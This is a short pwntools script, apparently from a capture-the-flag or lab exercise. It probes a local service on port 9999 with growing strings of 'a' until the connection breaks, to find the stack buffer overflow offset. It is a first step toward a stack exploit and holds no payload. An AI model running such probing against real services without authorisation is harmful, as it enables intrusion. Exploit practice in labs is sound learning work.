from pwn import *
def get_offset():
    i = 1
    while 1:
        try:
            p = remote('127.0.0.1',9999)
            p.recvuntil("WelCome my friend,Do you know password?\n")
            payload = 'a' * i
            print("Now the payload is ",payload)
            p.sendline(payload)
            data = p.recv()
            p.close()
            if not data.startswith('No password'):
                return i-1
            else:
                i+=1

        except EOFError:
            p.close()
            print("Success,EOFError,Stack is overflow...")
            return i-1
size = get_offset()
print("offset is ",size)
